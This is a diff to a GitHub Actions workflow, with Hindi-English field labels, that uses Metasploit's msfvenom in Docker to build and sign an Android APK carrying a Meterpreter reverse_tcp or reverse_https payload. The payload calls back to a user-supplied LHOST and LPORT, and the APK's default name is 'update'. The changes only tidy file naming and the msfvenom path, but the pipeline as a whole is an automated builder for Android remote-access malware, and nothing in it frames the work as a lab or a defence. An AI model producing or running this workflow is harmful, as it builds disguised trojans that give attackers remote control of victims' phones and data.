@@ -19,7 +19,7 @@ on:
           - android/meterpreter/reverse_https
           - android/meterpreter/reverse_tcp
       app_name:
-        description: "APK ka naam"
+        description: "APK ka naam (.apk optional)"
         required: false
         default: "update"
 
@@ -47,25 +47,24 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
+      - name: Normalize app name
+        run: echo "APK_NAME=${APK_NAME%.apk}" >> "$GITHUB_ENV"
+
       - name: Pull Metasploit image
-        run: |
-          docker pull metasploitframework/metasploit-framework:latest
-          docker run --rm --entrypoint ./msfvenom \
-            metasploitframework/metasploit-framework:latest --version
+        run: docker pull metasploitframework/metasploit-framework:latest
 
       - name: Generate APK
         run: |
           set -euo pipefail
           docker run --rm \
-            --entrypoint ./msfvenom \
+            --entrypoint /usr/src/metasploit-framework/msfvenom \
             -v "$PWD:/data" \
-            -w /data \
             metasploitframework/metasploit-framework:latest \
             -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
             -a dalvik --platform android \
             -o "/data/raw-${APK_NAME}.apk"
-          sudo chown "$(id -u):$(id -g)" raw-*.apk
-          ls -lh raw-*.apk
+          sudo chown "$(id -u):$(id -g)" "raw-${APK_NAME}.apk"
+          ls -lh "raw-${APK_NAME}.apk"
 
       - name: Zipalign + Sign
         run: |
